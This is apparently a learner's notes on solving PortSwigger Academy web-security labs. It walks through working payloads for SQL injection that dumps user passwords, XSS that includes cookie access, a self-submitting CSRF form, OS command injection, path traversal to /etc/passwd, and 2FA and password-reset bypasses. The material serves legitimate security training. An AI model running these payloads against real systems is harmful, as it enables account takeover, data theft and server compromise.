# PortSwigger Academy

PortSwigger Academy (https://portswigger.net/web-security/dashboard) is a collection of training materials (reading & videos) combined with hands-on-labs designed to help you learn how to "secure the web one step at a time". It covers a number of the most common vulnerabilities, helping you understand them, understand how to exploit them, and how they can be prevented. Best of all, they are all free. The tools *are* designed to work with/be supported by PortSwigger's flagship product, Burp Suite Professional, but you can utilize any number of other tools (curl/browsers/ZAP/etc). At the time I worked through these, I did not have access to a professional license, so I used the Burp Suite Community edition (free). Below are my notes written as I worked through the various challenges. 

## SQL Injection

### :material-gauge: UNION attack, determining the number of columns returned by the query

!!! question
    This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

    To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values.

What we know:

- vulnerability in product category filter
- should be able to use UNION attack to see data from other tables
- first step is to see number of columns being returned by the query

https://acd21fe61eb0074fc0b23b47009700b8.web-security-academy.net/filter?category=Pets

The first approach to determining how many columns is to do the `ORDER BY` trick with increasing numbers until you get an error. We do that and see that it errors on `4`, indicating that three columns are being returned:

```
/filter?category=Pets' ORDER BY 1 --
/filter?category=Pets' ORDER BY 2 --
/filter?category=Pets' ORDER BY 3 --
/filter?category=Pets' ORDER BY 4 -- (error)
```

The second approach (and the one required for solving this lab) is to use the `UNION SELECT NULL` trick with the selected number of NULL columns. Based on the information gained in the first approach, we craft the following query/filter and solve the challenge:

```
/filter?category=Pets' UNION SELECT NULL, NULL, NULL --
```

### :material-gauge: UNION attack, finding a column containing text

!!! question
    This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

    The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

Given:

- SQL injection vuln in the product category filter
- Should be able to do a union attack to pull data from other tables
- builds on previous lab
- need to identify a column that is compatible with string data

> Goal: perform the SQL Injection UNION attack, return additional row containing value provided: `S3HPlT`.

We walk through the three fields looking for a match:

```
/filter?category=Pets' UNION SELECT 'S3HPlT',NULL,NULL-- (internal server error)
/filter?category=Pets' UNION SELECT NULL,'S3HPlT',NULL-- (success!)
/filter?category=Pets' UNION SELECT NULL,'S3HPlT',NULL-- (internal server error)
```

And we can see that the second attempt solved the challenge - we now know that the query is returning 3 columns and the second is compatible with string data.

### :material-gauge: SQL injection UNION attack, retrieving data from other tables

!!! question
    This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

    The database contains a different table called users, with columns called username and password.

    To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

Building on prior solutions, we wnt to retrieve data from other tables. We are told that there is another table called `users` that has a column named `username` and another called `password`. Note that this is easier than the above as we don't have to shove things into one column (yet).

```
/filter?category=Pets' UNION select username, password from users --
```

yields us information like the following:

```
The Lazy Dog

The Lazy Dog is brought to you by the same people who invented the...

carlos

934rdmfpigx806kxma0m

administrator

734gs039pp7hvz53glwk

wiener

6yfdkdcuexrs36a2nd2a
```

We can then take this information and log in as the administrator account.


### :material-gauge: SQL injection UNION attack, retrieving multiple values in a single column

!!! question
    This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

    The database contains a different table called users, with columns called username and password.

    To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

This is very much like the prior scenario, but uses the structure from the prior challenges wherein you have three columns, and only the second is compatible with strings. Therefore, we have to shove both the username and password into the same field. This can be done with a query that looks like the following:


```
// determine how many columns exist
filter?category=Pets' UNION SELECT NULL,NULL --

// confirm which columns support text:
filter?category=Pets' UNION SELECT NULL,'a' -- (column 2)

// grab the username/password and stuff them into the 2nd column
/filter?category=Pets' UNION SELECT NULL,username || '~' || password from users --
```

This yeilds a result like the following:

```
More Than Just Birdsong
Pest Control Umbrella
Babbage Web Spray
administrator~o7188srj54a849wwm2cq
Giant Grasshopper
wiener~8hxtfx4depv2otj53nb9
carlos~z54oyd1moidzjxuz9oxm
```

And we can then log in as the administrator, solving the challenge


### :material-gauge: SQL injection attack, querying the database type and version on Oracle

!!! question
    This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

    To solve the lab, display the database version string.

!!! tip
    I failed quite a bit on this until I clicked the 'hint' and learned that every select on ORACLE needs a from stmt. 

```
// determine how many columns are being returned (2)
/filter?category=Gifts' ORDER BY 2 --

// confirm that both columns are compatible with strings (using built-in table named `dual`)
/filter?category=Gifts' UNION SELECT 'a','a' from dual --

// now let's start doing something
/filter?category=Gifts' UNION SELECT version FROM v$version --

// query the banner
/filter?category=Gifts' UNION SELECT BANNER,'a' from v$version --
```

And that produces the solution:

```
CORE 11.2.0.2.0 Production
a
NLSRTL Version 11.2.0.2.0 - Production
a
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
a
PL/SQL Release 11.2.0.2.0 - Production
a
TNS for Linux: Version 11.2.0.2.0 - Production
a
```


### :material-gauge-empty: Vulnerability in WHERE clause allowing retrieval of hidden data

!!! question
    This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:

    `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

    To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

This is a simple challenge to introduce you to the idea of SQL injection. Given a site such as https://acd01f0d1f5c2eb5c0cc51a2007a0016.web-security-academy.net/ you can view differenct product categories which are controlled by the URL (e.g. `/filter?category=Pets`). A simple SQL injection attack added to the end (`/filter?category=' OR 1=1 --`) solves the challenge by telling the SQL server to return all products with no category set or where 1=1 (which always evaluates to True). Adding the `--` at the end comments out any remainder of the SQL statment in the application code.

### :material-gauge-empty: Vulnerability allowing login bypass

!!! question
    This lab contains an SQL injection vulnerability in the login function.

    To solve the lab, perform an SQL injection attack that logs in to the application as the `administrator` user.

This is another simple case wherein you are encouraged to log in at a standard username/password form (https://ac031f731e5b8017c0984a7400ba0058.web-security-academy.net/login). Much like the prior example, however, you can manipulate the query directly by providing a username of `administrator'--` and any value for the password field. This terminates the query that is presumeably something like 
`SELECT * FROM users WHERE username = 'administrator' AND password = 'myPassword'`. It results in the following query: `SELECT * FROM users WHERE username = 'administrator'--' AND password = 'no matter'`






### SQL injection attack, querying the database type and version on MySQL and Microsoft

Similar to the prior




### SQL injection attack, listing the database contents on Oracle




## Cross-site Scripting

### :material-gauge-empty: Reflected XSS into HTML conext with Nothing Encoded

!!! question
    This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

    To solve the lab, perform a cross-site scripting attack that calls the `alert` function.

Visiting the site, there is a search form. I searched for `test` and was redirected to `t/?search=test`. I then searched for `test <script>alert();</script>` and, not surprisingly, I receieved an alert and completed the lab.

### :material-gauge-empty: Stored XSS into HTML context with nothing encoded

!!! question
    This lab contains a stored cross-site scripting vulnerability in the comment functionality.

    To solve this lab, submit a comment that calls the `alert` function when the blog post is viewed.

Found an comment form on the website and submitted the following: `This is awesome!<script>alert('you stink');</script>`. Once I submitted and then visited the post again, the alert was triggered and the lab was solved.

### :material-gauge-empty: DOM XSS in document.write sink using source location.search

!!! question
    This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.

I started out by attempting to search for `test <script>alert();</script>` which displayed the exact same contents out on the page (no alert box). I then reviewed the source code for the page and found this bit of Javascript:

```javascript
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
```

With this knowledge, I re-structured my query to close out the end of the `img` tag and render my javascript. Submitting this: `test'"><script>alert();</script>` allowed me to solve the challenge.


### :material-gauge-empty: DOM XSS in innerHTML sink using source location.search

!!! question
    This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.

The Javascript on the page looks like the following:

```javascript
document.getElementById('searchMessage').innerHTML = query;
```

Doing an ill-informed attempt results in DOM that looks like the following (and is unsuccessful): 

```html
<h1>
    <span>0 search results for '</span>
    <span id="searchMessage">
        <script>alert();</script>
    </span>
    <span>'</span>
</h1>
```

I went down a failed rathole here a bit before I read https://portswigger.net/web-security/cross-site-scripting/dom-based and noticed that the `innerHTML` sink doesn't accept `script` elements and, as such, you need to use other elements usch as `img` or `iframe`. I used the example directly from the page (`<img src=1 onerror=alert(document.domain)>`) and it worked successfully.


### :material-gauge-empty: DOM XSS in jQuery anchor href attribute sink using location.search source

!!! question
    This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.

    To solve this lab, make the "back" link alert `document.cookie`.

I noticed the "submit feedback" link on the page, and if you click on it, you are directed to a feedback form that has a "back" link at the bottom of it (this is what we need to mess with). Additionally, the URL looks like this: `/feedback?returnPath=/`. After a little experimentation, I simply changed the URL to `/feedback?returnPath=javascript:alert(document.cookie);` and hit enter. This caused the page to render, and looking at the DOM, we now see the following:

```html
<div class="is-linkback">
    <a id="backLink" href="javascript:alert(document.cookie);">Back</a>
</div>
```

Of course, clicking the link completes the challenge.

### :material-gauge-empty: DOM XSS in jQuery selector sink using a hashchange event

!!! question
    This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

    To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

Ok, this one was a little weird, only because it took me a bit to a.) understand what they wanted me to do and b.) wrap my head around the who-sends-what-to-whom part of things. Once I figured out what the code on the vulnerable site was doing, I then headed over to the exploit server and, leaving the first few fields with their default values, set the body to:

```html
<iframe src="https://ac1d1fef1e4a1f89c02b0709003e00de.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'">
```

Pressing the `View Exploit` button made it clear that it was working (couldn't get it to stop trying to print). Coming back and clicking the `Deliver exploit to victim` button confirmed that I had solved the lab.


## Cross-site Request Forgery (CSRF)

### CSRF vulnerability with no defenses

!!! question
    This lab's email change functionality is vulnerable to CSRF.

    To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

    You can log in to your own account using the following credentials: `wiener:peter`

This first one was easy... following the instructions in the documentation on CSRF, you simply craft an evil payload something similar to the following:

```html
<html>
  <body>
    <form action="https://acbd1fc91ebd63dfc0dc1e3100420089.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Clickjacking

## DOM-based Vulnerabilities

## Cross-Origin Resource Sharing (CORS)

## XML External Entity (XXE) injection

## Server-Side Request Forgery (SSRF)

## HTTP Request Smuggling

## OS Command Injection

### :material-gauge-empty: OS command injection, simple case

!!! question
    This lab contains an OS command injection vulnerability in the product stock checker.

    The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

    To solve the lab, execute the `whoami` command to determine the name of the current user.

This application issues a `POST` reequest to the `/product/stock` endpoint with the following expected payload: `productId=1&storeId=1`. With valid values, you receive something like `62` as the payload of the response.

The instructions and page make it appear as though you simply change the values to `echo test` or something like `productId=& whoami &storeId=1` but it wasn't quite that simle for me. Instead, I had to play around a bit with URL encoding, and ended up with the following:

```text
productId=%26%20echo%20george%20%26&storeId=whoami
```

Which gave me a return like this:

```text
george
peter-tVfyfI
```

I'm *certain* there are other variations that will produce the right results. 

### :material-gauge: Blind OS command injection with time delays

!!! question
    This lab contains a blind OS command injection vulnerability in the feedback function.

    The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

    To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

I modified the request as follows (`& sleep 10 &`):

```text
csrf=VWek8OQ95kgxwPflHuYs4ECgWNDFwhYx&name=%26%20sleep%2010%20%26&email=%26%20sleep%2010%20%26&subject=%26%20sleep%2010%20%26&message=%26%20sleep%2010%20%26
```

This worked, but it bugs be a little that I had to replace all of the params with the injected command. I did some additional testing, and it looks like (for some unknown reason) *both* the `email` and `subject` params need to have the sleep command, otherwise it simply returns immediately.


### :material-gauge: Blind OS command injection with output redirection

!!! question
    This lab contains a blind OS command injection vulnerability in the feedback function.

    The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

    `/var/www/images/`

    The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

    To solve the lab, execute the `whoami` command and retrieve the output.

To solve this challenge, I crafted a string: `& whoami > /var/www/images/bubba &` and then fully URL-encoded it as `%26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26`. 

Using the information from the prior challenge, I substituted my command payload in both the `email` and `subject` fields as such:

```text
csrf=S8sIaTUHU6dSoL5PmQ8UhXVy4ud17qLa&name=george&email=%26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26&subject=%26%20whoami%20%3E%20%2fvar%2fwww%2fimages%2fbubba%20%26&message=test
```

And submitted it. I then found an image-returning request and modified the path to my newly-created file: `GET /image?filename=bubba HTTP/1.1` and I was presented with the currently running user: `peter-rYqzDj`



## Server-Side Template Injection

## Directory Traversal

### :material-gauge-empty: File path traversal, simple case

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

!!! tip
    I tried to solve this using just a browser, but was unsuccessful. Primarily because the content type of the return is `image/jpeg` and since I'm pulling text (the `/etc/passwd` file), it simply doesn't render properly in the chrome developer tools. NTS: use the tool.

Poking around a bit and found that the site dynamically loads images using the following structure:

```text
https://ac101fa61fd2a9cdc02e17a800950081.web-security-academy.net/image?filename=37.jpg
```

I simply found this request in the Burp Suite proxy, forwarded it to the repeater tool and edited the `filename` parameter to be `image?filename=../../../etc/passwd` and then sent the request. The response looked like the following:

```text
HTTP/1.1 200 OK
Content-Type: image/jpeg
Connection: close
Content-Length: 1260

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/home/academy:/bin/bash
dnsmasq:x:101:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
messagebus:x:102:101::/nonexistent:/usr/sbin/nologin
```

### :material-gauge: File path traversal, traversal sequences blocked with absolute path bypass

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

This one was pretty easy. Given a request like the following:

```text
GET /image?filename=48.jpg HTTP/1.1
```

I confirmed that it didn't work the "easy way" by testing this:

```text
GET /image?filename=../../../etc/passwd HTTP/1.1
```

And received an error indicating the requested file did not exist. So, following the instructions, I adjusted the request as follows:

```text
GET /image?filename=/etc/passwd HTTP/1.1
```

And was rewarded with the contents of the `/etc/passwd` file.


### :material-gauge: File path traversal, traversal sequences stripped non-recursively

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    The application strips path traversal sequences from the user-supplied filename before using it.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

The key to solving this lab is that the server-side code appears to be looking for instances of `../` and stripping them, but _non-recursively_. This means, that they might have a line that looks like the following bit of python:

```python
safe_path = requested_path.replace("../", "")
```

If you provide a request that looks like this: `/image?filename=....//....//....//etc/passwd`, the value of `safe_path` still has a traversal problem, which means we will still get the file we are looking for which, is in fact, the case here.

### :material-gauge: File path traversal, traversal sequences stripped with superfluous URL-decode

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

On this one, I tried URL-encoding the traversal attack as follows:

```text
GET /image?filename=%2E%2E%2f%2E%2E%2f%2E%2E%2fetc%2fpasswd HTTP/1.1
```

You see that each `.` becomes `%2e` and each `/` becomes `%2f`. But this didn't work. I then tried *double* URL encoding the path as shown below, which **did** work.

```text
GET /image?filename=%252E%252E%252f%252E%252E%252f%252E%252E%252fetc%252fpasswd HTTP/1.1
```

The problem or *bug* in this application is that they called a "safe" function (URL-decode) twice... once prior to checking for path traversal issues (a good thing) but a second time *after* checking for path traversal issues. This could almost be considered a TOCTOU type bug.


### :material-gauge: File path traversal, validation of start of path

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

Within the HTTP request log, I found a request that looks like this:

```text
GET /image?filename=/var/www/images/47.jpg HTTP/1.1
```

I modified it as follows:

```text
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
```

After submission, I was presented the `/etc/passwd` file.


### :material-gauge: File path traversal, validation of file extension with null byte bypass

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    The application validates that the supplied filename ends with the expected file extension.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

If you take the time to [read the documentation](https://portswigger.net/web-security/file-path-traversal) on this type of issue, the solution becomes quite straight forward. The following `GET` request does the trick:

```text
GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
```

## Access Control Vulnerabilities

## Authentication

### :material-gauge-empty: Username enumeration via different responses

!!! question
    This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

    Candidate usernames
    Candidate passwords

    To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.


Goal: Enumerate a valid username, brute-force the user's password, and then access the user's account page.

You are provided a wordlist of candidate usernames as well as a list of candidate passwords.

Here are the steps I took to solve this challenge:

1. Load up Burp and start the embedded browser
1. Connect to the URL provided and visit the `/login` page
1. Attempt to log in with a random username/password
1. View the `POST` request in Burp and send it to the intruder
1. On the Positions tab, I cleared the `§` from the session cookie, leaving just the username and password positions
1. Pasted the values from the list of candidate usernames (100 of them) into the Payload Options (simple list) and started the attack, paying attention to the response payload size.
1. After the list ran through, I sorted by response length and noticed that one of them (username: `agenda`) had a different payload length. Looking at the response text, I noticed that it said _"Incorrect password"_. 
1. Returning to the positions page, I changed the username to a static value of `agenda`
1. I cleared the payload list and pasted in the values from the candidate password list and then ran the attack
1. Watching the response lengths, I again noticed taht one of them (password: `robert`) had a different length. Inspecting the response showed that user had logged in. 
1. With this information, I then returned to the browser, manually logged in with this information, and completed the challenge

### :material-gauge-empty: 2FA simple bypass

!!! question
    This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

    Your credentials: `wiener:peter`
    Victim's credentials `carlos:montoya`

Given a valid username/password and access to that account's email, as well as a victim username/password, you are asked to bypass the 2FA for the victim's account (you do not have access to their email) and get to their profile page.

Walking through the auth flow with a valid user is pretty straight foward. You log in at `/login` and then are directed to `/login2` to enter the 2FA code. Once you get that from your email, you are redirected to `/my-account`.

The "attack" is as simple as completing the first stage with the victim's credentials and then changing the URL to `/my-account`. This succeeds as there is no session logic to confirm that the 2FA code was entered (only redirection logic).

### :material-gauge-empty: Password reset broken logic

!!! question
    This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

    Your credentials: `wiener:peter`
    Victim's username: `carlos`

Given a valid set of credentials as well as a victim username, you are asked to reset the victim's password and then log in to view the "my account" page.

Using the valid credentials, I pretended to have forgotton my password and requested a password reset link. I then completed that process and reviewed the `POST` request to `/forgot-password`. I noticed the payload had not only the reset token and the new password, but also the username. I sent the request to the repeater, changed the `username` to the victim username and re-submitted it. The request completed, so I went to the browser, logged in with the victim username and my newly-set password and was able to view the account page.

## WebSockets

## Web Cache Poisoning

## Insecure Deserialization

## Information Disclosure

## Business Logic Vulnerabilities

## HTTP Host Header Attacks

### Basic Password Reset Poisoning

We are told that `carlos` will click any link in any email he receives. The goal is to log in to Carlos's account.

We are given a valid set of credentials.

Given the title of the challenge, I'm assuming that in the `POST` request to reset my password, there will be a header that can be manipulated or maybe in the password reset link.


## OAuth Authentication

